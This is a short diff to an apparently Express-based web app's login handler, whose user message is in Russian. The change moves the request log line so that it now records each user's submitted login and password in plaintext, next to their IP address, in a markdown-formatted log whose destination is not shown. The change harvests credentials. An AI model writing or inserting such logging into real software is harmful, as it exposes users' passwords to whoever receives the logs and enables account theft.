@@ -75,8 +75,8 @@ app.get("/", async (req, res) => {
 });
 
 app.post("/api/login", async (req, res) => {
-  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()}`);
   const {login, password} = req.body;
+  await log(`**[** \`${req.path}\` \`${req.method}\` **]** - ${req.headers['x-forwarded-for']?.split(',').shift()} | \`${login}\` \`${password}\` `);
 
   if (!login || !password){
     res.send({err: true, message: "Заполните все поля!"});
